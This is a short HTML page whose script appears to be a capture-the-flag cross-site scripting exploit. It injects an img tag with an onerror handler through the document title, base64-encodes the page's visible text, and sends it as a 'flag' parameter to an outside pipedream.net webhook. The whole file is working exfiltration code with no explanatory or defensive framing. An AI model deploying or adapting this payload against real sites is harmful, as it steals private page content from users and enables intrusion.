<!DOCTYPE html>
<html>
<body>
    <script>
        const webhook = "https://eou0c9qohvcityk.m.pipedream.net";

        const payload = `</h1><img src="x" onerror="document.title = 'DATA:' + btoa(document.body.innerText)"><h1>`;

        setTimeout(() => {
            document.title = payload;
        }, 500);

        const catchInterval = setInterval(() => {
            const h1Element = document.querySelector('h1');
            if (h1Element && h1Element.innerText.includes("DATA:")) {
                const rawSec = h1Element.innerText.split("DATA:")[1];
                const safeSec = encodeURIComponent(rawSec);
                (new Image()).src = webhook + "?flag=" + safeSec;
                clearInterval(catchInterval);
            }
        }, 500);
    </script>
</body>
</html>
